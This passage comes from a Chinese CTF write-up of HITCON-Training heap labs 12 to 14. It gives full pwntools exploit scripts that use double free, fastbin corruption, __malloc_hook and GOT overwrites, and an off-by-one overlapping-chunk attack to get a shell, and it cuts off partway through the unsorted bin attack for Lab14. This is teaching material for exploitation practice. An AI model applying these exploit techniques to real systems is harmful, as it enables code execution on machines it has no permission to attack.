title=\"劫持控制流\"></a>劫持控制流</h4><p>我们通过复写<code>__malloc_hook</code>的got表即可实现利用，在libc上，<code>__malloc_hook</code>紧挨着main_arena（已经leak得到main_arena+0x88的地址）。我们仍然通过上述调整偏移的方法，寻找某个<code>__malloc_hook</code>之前合法的地址。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/32gx 0x7fdaa8a46af0 + 5 - 0x8</span><br><span class=\"line\">0x7fdaa8a46aed &lt;_IO_wide_data_0+301&gt;:\t0xdaa8a45260000000\t0x000000000000007f</span><br><span class=\"line\">0x7fdaa8a46afd:\t0xdaa8707e20000000\t0xdaa8707a0000007f</span><br><span class=\"line\">0x7fdaa8a46b0d &lt;__realloc_hook+5&gt;:\t0x000000000000007f\t0x0000000000000000</span><br><span class=\"line\">0x7fdaa8a46b1d:\t0x0000000000000000\t0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>可以看到，当分配到如下地址时，size正好为0x7f，即malloc(0x60)的chunk，然后我们将<code>__malloc_hook</code>覆盖为one_gadget即可。</p>\n<h4 id=\"触发-malloc-hook\"><a href=\"#触发-malloc-hook\" class=\"headerlink\" title=\"触发__malloc_hook\"></a>触发__malloc_hook</h4><p>这里如果我们直接调用add功能，而在malloc(0x28)时触发malloc_hook，会发现所有的one_gadget地址都不符合要求。这里我们有一个小trick，如果我们对同一个chunk free两次，触发对double free的报错，这时libc代码也会触发_malloc_hook。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 两次free同一个chunk，触发报错函数</span></span><br><span class=\"line\"><span class=\"comment\">// 而调用报错函数的时候又会用到malloc-hook，从而getshell</span></span><br><span class=\"line\"><span class=\"comment\">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class=\"line\"><span class=\"comment\">       record we are going to add (i.e., double free).  */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (__builtin_expect (old == p, <span class=\"number\">0</span>))</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        errstr = <span class=\"string\">\"double free or corruption (fasttop)\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> errout;</span><br><span class=\"line\">\t\t\t&#125;</span><br></pre></td></tr></table></figure>\n<p>完整exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./secretgarden\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./secretgarden\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size, name, color)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"name :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"flower :\"</span>)</span><br><span class=\"line\">\tp.send(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"flower :\"</span>)</span><br><span class=\"line\">\tp.sendline(color)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">visit</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">del_</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"garden:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">clean</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">\"a\"</span>,<span class=\"string\">\"aaaa\"</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">\"b\"</span>,<span class=\"string\">\"bbbb\"</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">del_(<span class=\"number\">0</span>)</span><br><span class=\"line\">clean()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">\"c\"</span>,<span class=\"string\">\"cccc\"</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\"></span><br><span class=\"line\">visit()</span><br><span class=\"line\">libc_addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">offset = <span class=\"number\">0x3c4b63</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc.address = libc_addr - offset</span><br><span class=\"line\"></span><br><span class=\"line\">malloc_hook = libc.symbols[<span class=\"string\">'__malloc_hook'</span>]</span><br><span class=\"line\">addr = <span class=\"number\">0x3c4aed</span> + libc.address</span><br><span class=\"line\">one_gadget = <span class=\"number\">0xf02a4</span> + libc.address</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"a\"</span>, <span class=\"string\">\"aaaa\"</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"b\"</span>, <span class=\"string\">\"bbbb\"</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\"></span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\">del_(<span class=\"number\">3</span>)</span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, p64(addr), <span class=\"string\">\"fake\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"c\"</span>, <span class=\"string\">\"cccc\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"d\"</span>, <span class=\"string\">\"dddd\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"number\">0x13</span> * <span class=\"string\">\"e\"</span> + p64(one_gadget),<span class=\"string\">\"asdf\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab13——heapcreator\"><a href=\"#Lab13——heapcreator\" class=\"headerlink\" title=\"Lab13——heapcreator\"></a>Lab13——heapcreator</h2><h3 id=\"防护-3\"><a href=\"#防护-3\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab13$ checksec heapcreator</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab13/heapcreator&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-3\"><a href=\"#分析-3\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>该题也是标准的堆题，功能有增删改查。</p>\n<h4 id=\"create\"><a href=\"#create\" class=\"headerlink\" title=\"create\"></a>create</h4><p>首先malloc(0x10)的chunk，存储在全局指针数组heaparray上。chunk中记录指向内容的指针和输入的size，</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">chunk</span>&#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> size; <span class=\"comment\">// 0x0</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *content; <span class=\"comment\">// 0x8</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"edit\"><a href=\"#edit\" class=\"headerlink\" title=\"edit\"></a>edit</h4><p>该功能内存在漏洞，在写入的时候会多写入一位，所以存在off_by_one write漏洞。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">edit_heap</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v3; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Index :\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">4u</span>LL);</span><br><span class=\"line\">  v1 = atoi(&amp;buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Out of bound!\"</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( heaparray[v1] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Content of heap : \"</span>, &amp;buf);</span><br><span class=\"line\">    read_input(*((<span class=\"keyword\">void</span> **)heaparray[v1] + <span class=\"number\">1</span>), *(_QWORD *)heaparray[v1] + <span class=\"number\">1L</span>L);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Done !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"No such heap !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"show\"><a href=\"#show\" class=\"headerlink\" title=\"show\"></a>show</h4><p>输出size和content的内容。</p>\n<h4 id=\"delete\"><a href=\"#delete\" class=\"headerlink\" title=\"delete\"></a>delete</h4><p>依次free掉content和chunk两个堆块，然后将heaparray全局数组上对应项置为NULL，所以不存在UAF漏洞。</p>\n<h3 id=\"利用-3\"><a href=\"#利用-3\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>​    我们要利用off-by-one写漏洞，实现前向的overlapping，具体方法是，首先申请两个size分别为0x18和0x10的chunk，使得size为0x18的chunk复用下一个chunk的prev_size字段；然后用edit功能修改下个chunk的size字段为\\x41（或\\x40）都可以，此时调用delete功能，就会向fastbin数组中0x20和0x40的单向链表中分别放入一个chunk，其中0x40的chunk与0x20的chunk形成了重叠，之后的利用就顺理成章了，我们看一下exp。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./heapcreator\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./heapcreator\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">create</span><span class=\"params\">(size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Heap :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"heap:\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"heap : \"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x18</span>, <span class=\"string\">\"a\"</span>) <span class=\"comment\"># 0 </span></span><br><span class=\"line\">create(<span class=\"number\">0x10</span>, <span class=\"string\">\"b\"</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># change size</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>, <span class=\"string\">\"a\"</span> * <span class=\"number\">0x18</span> + <span class=\"string\">\"\\x41\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">atoi_got = elf.got[<span class=\"string\">'atoi'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># push to fastbin</span></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + <span class=\"string\">\"\\x21\"</span>.ljust(<span class=\"number\">8</span>,<span class=\"string\">\"\\x00\"</span>) + p64(<span class=\"number\">0x30</span>) + p64(atoi_got)</span><br><span class=\"line\"><span class=\"comment\"># use overlapping </span></span><br><span class=\"line\">create(<span class=\"number\">0x30</span>, payload) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak</span></span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">libc_base = addr - libc.symbols[<span class=\"string\">'atoi'</span>]</span><br><span class=\"line\">one_gadget = <span class=\"number\">0xf1147</span> + libc_base</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># hijack got</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>, p64(one_gadget))</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">\"pwnit\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab14——magicheap\"><a href=\"#Lab14——magicheap\" class=\"headerlink\" title=\"Lab14——magicheap\"></a>Lab14——magicheap</h2><h3 id=\"防护-4\"><a href=\"#防护-4\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab14$ checksec magicheap</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab14/magicheap&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-4\"><a href=\"#分析-4\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>还是增删改查。</p>\n<p>当输入4869时，若全局变量magic &gt; 0x1305，则直接cat flag。</p>\n<p>漏洞存在于edit功能中，存在一个任意长度的堆溢出。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">edit_heap</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> v0; <span class=\"comment\">// ST08_8</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// [rsp+4h] [rbp-1Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v4; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Index :\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">4u</span>LL);</span><br><span class=\"line\">  v2 = atoi(&amp;buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v2 &lt; <span class=\"number\">0</span> || v2 &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Out of bound!\"</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( heaparray[v2] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Size of Heap : \"</span>, &amp;buf);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">8u</span>LL);</span><br><span class=\"line\">    v0 = atoi(&amp;buf);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Content of heap : \"</span>, &amp;buf);</span><br><span class=\"line\">    read_input(heaparray[v2], v0);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Done !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"No such heap !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们需要利用这个堆溢出漏洞，完成bss段修改的需求。最容易想到的方法应该是直接构造unlink利用。</p>\n<p>该题由于提示用unsorted bin attack，unsorted bin attack的利用效果是将任意地址的数修改为一个很大的数，看起来似乎没有什么用，但也至少有如下两个利用场景：</p>\n<ul>\n<li>我们通过修改循环的次数来使得程序可以执行多次循环。</li>\n<li>我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。</li>\n</ul>\n<p>具体的原理可以去CTF Wiki上看（<a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack/\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack/</a>）</p>\n<p>我们使用堆溢出，修改相邻的位于unsorted bin中的chunk的bk字段，指向我们想要修改的地址 - 0x10。由于unsorted bin是FIFO，我们只需要malloc一次，就能将目标地址的数修改为main_arena+offset的地址，即一个远远大于0x1305的数，也就实现了利用。</p>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span 